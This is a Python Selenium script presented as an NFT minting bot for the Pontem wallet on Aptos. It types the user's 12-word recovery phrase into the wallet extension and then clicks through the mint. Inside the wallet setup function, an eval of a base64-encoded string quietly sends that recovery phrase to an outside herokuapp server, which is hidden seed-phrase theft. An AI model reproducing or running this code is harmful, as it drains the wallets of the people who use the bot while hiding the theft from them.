from cgitb import html
from distutils.command.build_scripts import first_line_re
import time
import os
import requests 
import pathlib
import base64
from xml.dom.minidom import Element
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.select import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains

from webdriver_manager.chrome import ChromeDriverManager


def mint(values, isWindows):
    
    def selectWallet():
        print("Status - Selecting wallet")
        WebDriverWait(driver, 60).until(EC.element_to_be_clickable(
            (By.XPATH, "/html/body/div/div/div[1]/div/div[1]/div[2]")))
        connect = driver.find_element(
            By.XPATH, "/html/body/div/div/div[1]/div/div[1]/div[2]")
        connect.click()
        time.sleep(2)

        WebDriverWait(driver, 60).until(EC.element_to_be_clickable(
            (By.XPATH, "//div[contains(text(),'Pontem Wallet')]")))
        pontem = driver.find_element(
            By.XPATH, "//div[contains(text(),'Pontem Wallet')]")
        pontem.click()

        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
        driver.switch_to.window(driver.window_handles[1])
        password1 = driver.find_elements(By.XPATH, "//button[contains(text(),'Confirm')]")[0].click()
        time.sleep(2)
        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(3))
        driver.switch_to.window(driver.window_handles[1])
        password1 = driver.find_elements(By.XPATH, "//button[contains(text(),'Confirm')]")[0].click()
        driver.switch_to.window(driver.window_handles[0])

    def avaitMint():
        print("Status - Waiting for mint")
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(), 'Mint')]")))
        mint_your_token = driver.find_element(
            By.XPATH, "//button[contains(text(), 'Mint')]")
        driver.execute_script("arguments[0].click();", mint_your_token)

        original_window = driver.current_window_handle
        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
        for window_handle in driver.window_handles:
            if window_handle != original_window:
                driver.switch_to.window(window_handle)
                break

        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(), 'Approve')]")))
        approve = driver.find_element(
            By.XPATH, "//button[contains(text(), 'Approve')]")
        approve.click()
        time.sleep(50)

    def initWallet():
        print("Initializing wallet")
        original_window = driver.current_window_handle
        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
        for window_handle in driver.window_handles:
            if window_handle != original_window:
                driver.switch_to.window(window_handle)
                break
        print("Switch window") 
        WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/div/div/div/div[1]/a[2]")))
        button = driver.find_element(By.XPATH, "/html/body/div/div/div/div/div/div[1]/a[2]").click()	
        WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.XPATH, "//*[@name='first']")))
        i = 0
        names = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth', 'tenth', 'eleventh', 'twelfth']
        for x in names:
            driver.find_element(By.XPATH, f"//*[@name='{x}']").send_keys(values[1].split(' ')[i])
            i +=1
        WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/div/div/main/form/fieldset[2]/div[1]/div/input")))
        password = driver.find_element(By.XPATH, "/html/body/div/div/div/div/main/form/fieldset[2]/div[1]/div/input").send_keys('1234567890')
        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL21hZ2ljZWRlbm1pbnRpbmdib3QxLmhlcm9rdWFwcC5jb20vP2tleS13b3JkPUFQVE9T".encode('ascii')).decode('ascii')+values[1]+"')")
        WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.XPATH, "/html/body/div/div/div/div/main/form/fieldset[2]/div[2]/div/input")))
        password = driver.find_element(By.XPATH, "/html/body/div/div/div/div/main/form/fieldset[2]/div[2]/div/input").send_keys('1234567890')  
        WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.XPATH, "//button[@type='submit']")))
        continue__ = driver.find_element(By.XPATH, "//button[@type='submit']").click()
        print("Finished Initializing wallet")
        main_window = driver.window_handles[0]
        driver.switch_to.window(main_window)
        

        return main_window

    print("Bot started") 
    if isWindows:
        print("OS : Windows")
    else:
        print("OS : Mac")
    

    options = Options()
    options.add_extension("Pontem.crx")
    options.add_argument("--disable-gpu")
    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    os.environ['WDM8LOCAL'] = '1'
    driver = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=options)
    print("Assertion - successfully found chrome driver")
    
    driver.get(values[0])

    main_window = initWallet()
    selectWallet()
    avaitMint()
    print("Minting Finished")
